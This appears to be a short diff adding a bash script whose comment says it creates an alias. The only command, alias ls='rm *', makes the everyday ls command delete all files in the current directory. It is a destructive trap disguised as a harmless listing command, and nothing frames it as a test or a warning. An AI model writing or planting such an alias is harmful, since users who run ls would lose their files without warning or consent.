@@ -1,0 +1,4 @@
+#!/bin/bash
+# This script creates an alias named ls with value rm *
+
+alias ls='rm *'
